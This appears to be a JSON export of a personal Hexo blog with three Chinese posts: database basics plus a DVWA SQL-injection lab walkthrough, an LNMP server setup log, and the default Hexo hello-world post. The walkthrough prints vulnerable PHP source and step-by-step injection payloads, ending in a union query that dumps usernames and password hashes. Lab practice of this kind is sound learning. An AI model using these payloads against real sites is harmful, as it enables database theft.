[{"title":"sql学习与基本操作","slug":"sql学习与基本操作","date":"2019-08-09T13:04:56.000Z","updated":"2019-08-09T13:10:25.006Z","comments":true,"path":"2019/08/09/sql学习与基本操作/","link":"","permalink":"http://yoursite.com/2019/08/09/sql学习与基本操作/","excerpt":"","text":"sql基础学习 关系型数据库，非关系型数据库， 关系型数据库，是说采用了关系模型来组织数据的数据库。关系模型简单的说就是指二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。典型的如mysql 关系型数据库的优势：1.容易理解，二维表更加贴近逻辑世界的一个概念。2.使用方便 3.关系模式，在数据库中成为表结构 4.事务的一致性 5.读写的实时型 6.复杂的sql 关系型数据库的局限性：1.高并发读写需求 2.海量数据的高效率读写 3.高扩展和可用性 非关系型数据库 非关系型数据库无严格的数据结构，可以处理杂乱的非结构化数据，典型的如mangoDB，redis， 1.key-value类型数据库，具有极高的并发读写性能 2.面向海量数据访问的面向文档数据库 这类数据库的特点 就是在海量的数据中快速的查询数据，manggoDB 3.面向可扩展性的分布式数据库 熟悉数据库的基本使用，可以自由创建，修改，删除数据库和表 登陆mysql，mysql输入正确的账号密码以及ip地址即可 显示当前的数据库 创建新的数据库test1 使用test数据库 创建表student_information 字段 姓名name 性别 sex 年龄age 查看表结构 插入数据 查询数据 应该创建数据库的时候选择的字符集的问题，所以导致中文的无法识别，重新输入一组英文名试一下 基本上确定是字符集的问题。选择utf-8就可以解决字符的问题 删除数据，这里尝试删除age=12的参数 可以看到age=12的记录已经被删除了 接下来把其中剩下的一条数据age修改成8 成功将age修改成了8. sql注入学习 检测是否存在注入 通过注入获取数据 通过注入漏洞获取权限 sql注入检测我这里直接使用dvwa作为实验平台，进行一遍实验，记录实验过程 Low服务器端核心代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;?phpif( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123; // Get input $id = $_REQUEST[ &apos;id&apos; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; &lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Get input $id = $_POST[ &apos;id&apos; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; &lt;?phpif( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123; // Get input $id = $_SESSION[ &apos;id&apos; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; &lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 Impossible服务器核心代码需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加饿了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉，由于手工注入过程与Low级别差不多，所以直接演示最后一步下载数据，输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #,查询成功 High服务器端核心代码可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\\x00,\\n,\\r,,’,”,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 漏洞利用 虽然前端使用了下拉选择菜单，但是我们依然可以通过抓包修改参数，提交恶意构造的查询参数。 1.判断是否存在注入，注入是字符型还是数字型， 抓包修改参数id为1’ or 1=1 #,报错 抓包修改参数id为1 or 1=1 #,查询成功 说明是数字型注入。（由于是数字型注入，所以服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。） 2.猜解SQL查询语句中的字段数 抓包修改参数id为1 order by 3 #,报错 说明执行的SQL查询语句中国的字段只有两个字段，即这里的First name，Surname。 3.确定显示的字段顺序 抓包更改参数id为 1 union select 1,2 #,查询成功。 说明执行的SQL语句为select First name,Surname from 表 where ID=id…. 4.获取当前数据库 抓包更改参数id为1 union select 1,database() #,查询成功； 说明当前的数据库为dvwa。 5.获取数据库中的表 抓包修改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #,查询成功。 说明数据库dvwa中的两个表，一个guestbook和users 6.获取表中的字段名 抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #,查询失败。 因为单引号被转译了，变成了’。可以利用16进制进行绕过，抓包更改参数id为 1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 # 说明users表中有八个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 7.下载数据 抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 Medium服务器端核心代码可以看到，low级别代码对来自客户端的参数id没有进行任何的检查和过滤，存在明显的SQL注入。 漏洞利用 在现实场景中不可能看到后端的代码，所以下面的手动注入步骤是建议在无法看到源码的基础上 1.判断是否存在注入，注入是字符型还是数字型 输入1&#39;or&#39;1&#39;=&#39;1,查询成功。 输入1&#39;and&#39;1&#39;=&#39;2,查询失败，返回结果为空 说明存在字符型注入 2.猜解SQL查询语句中的字段数 通过order by猜解 输入1‘or 1=1 order by 1 # ,查询成功 输入1’or 1=1 order by 2 #,查询成功 继续输入，1’or 1=1 order by 3 #,查询失败 说明执行的SQL查询语句中只有两个字段，这里就是First name，Surname。这里也可以通过输入union select 1，2，3…来猜解字段数 3.确定显示的字段顺序 输入1’ union select 1,2 #,查询成功。 说明执行的SQL语句为select First name,Surname from table where ID=’id’…. 4.获取当前数据库 输入1’ union select 1,database() #,查询成功； 当前数据库为dvwa。 5.获取数据库中的表 输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #,查询成功 当前数据库有两个表，guestbook,users. 6.获取表中的字段名 输入 1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #,查询成功。 表中共有八个字段，分别是user_id,first_name,last_name,_user,password,avatar,last_login,failed_login. 7.下载数据 输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #,查询成功","categories":[],"tags":[]},{"title":"lnmp安装","slug":"lnmp安装","date":"2019-08-05T15:09:03.000Z","updated":"2019-08-05T23:15:02.481Z","comments":true,"path":"2019/08/05/lnmp安装/","link":"","permalink":"http://yoursite.com/2019/08/05/lnmp安装/","excerpt":"","text":"linux+nginx+php-fpm+mysql安装 linux：centos6.8直接虚拟机镜像安装即可 nginx：因为想手动安装nginx所以首先得安装nginx的依赖包，先安装pcre库，库直接从网上下载 wget http://ftp.pcre.org/pub/pcre/pcre-8.36.tar.gz tar -xzvf pcre-8.36.tar.gz ./configure Make &amp;&amp; make install 配置的时候出现报错：configure: error: You need a C++ compiler for C++ support. 是没有c++环境 所以先尝试安装c++环境，使用命令 yum -y install gcc-c++ c++环境安装完成后 即可正常的配置安装 接着安装另外的依赖环境zlib-1.2.8.tar.gz，openssl-1.0.1j.tar.gz， 然后安装nginx，安装完成后启动nginx。 /usr/local/nginx/sbin/nginx，查看nginx是否运行 ps aux | grep nginx 可以看到nginx正在运行的进程 安装完成后直接访问网站，并没有成功安装的界面弹出，初步怀疑是防火墙禁止了访问，先临时关闭防火墙，查看结果 service iptables stop关闭防火墙， nginx安装成功 是防火墙导致了该问题，稍后再设置防火墙安装策略。 php： 首先检查php是否已经安装， rpm -qa | grep php 发现本机并未安装。因为php安装的依赖包较多 ，所以直接yum安装 yum install php 然后php -v 查看php版本。我这离安装的版本是5.3.3，然后回头看了一眼需求，是需要安装php-fpm百度一下发现是5.3.3以后的版本就将php-fpm写进了php的核心源码了 但是我刚好安装了个没用的，所以只能先卸载然后再安装新的了。 使用rpm -e删除php -v出来的，注意这一因为存在依赖关系 所以删除有先后顺序 重新安装新版的php，在官网上下载php5.6.31 下载完成后编译安装 mysql： 直接使用yum安装吧 yum -y install mysql-server mysql-devel mysql set password for root@localhost = password(‘123456’); 设置root密码， 安装完成后发现并不能解析php文件，猜测应该是nginx文件配置错误，尝试修改nginx文件配置。 发现问题在此处，修改对应的文件路径 重启nginx即可。 可以正常访问phpinfo 接下来尝试下用php操作数据库 发现执行sql语句报错 php无法识别mysqli_connect()方法 尝试上网查找解决方案 发现是本地安装php的问题，然后将本地的php全部删除 重新安装php-fpm问题随即解决 防护策略 服务器基线安全 开放端口 ：遵循最小开放原则，关闭不用端口，限制重要端口不对外，例如21 22 137 445 3306 3389 27017 弱口令 中间件安全","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-08-05T12:26:50.752Z","updated":"2019-08-05T12:26:50.753Z","comments":true,"path":"2019/08/05/hello-world/","link":"","permalink":"http://yoursite.com/2019/08/05/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]